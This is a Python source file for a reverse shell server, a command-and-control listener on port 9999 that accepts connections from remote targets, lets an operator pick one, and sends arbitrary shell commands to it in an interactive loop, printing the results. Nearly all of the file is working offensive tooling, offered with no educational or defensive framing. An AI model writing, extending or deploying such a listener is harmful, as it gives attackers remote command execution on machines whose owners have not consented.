import os
from server import *

class ReverseShellServer(Server):
    def __init__(self,port):
        super().__init__(port)

    def send_command(self,comm,target_num):
        if -len(self.connections)>target_num or len(self.connections)-1<target_num:
            return "Invalid target..."
        #sending the command
        self.send_data(target_num,comm)
        #receiving the response back
        comm_response = self.recv_data(target_num)
        #returning the response of the command as the value of this method
        return comm_response

#testing the reverse shell server

if __name__ == "__main__":
    import threading
    from time import sleep

    server = ReverseShellServer(9999)
    def  server_listen():
        global server
        while True:
            server.accept_conn()
    def server_send_comm():
        global server
        target_num = int(input("Enter target_num>>").strip())
        first_comm = "pwd"
        while True:
            comm = input(f"{server.send_command(first_comm,target_num)}>>")    
            if comm == "quit":
                break
            res = server.send_command(comm,target_num)
            print(res)
        sleep(1)
        server_send_comm()

    listenThread = threading.Thread(target=server_listen,args=[])
    commSendThread = threading.Thread(target=server_send_comm,args=[])
    listenThread.start()
    commSendThread.start()
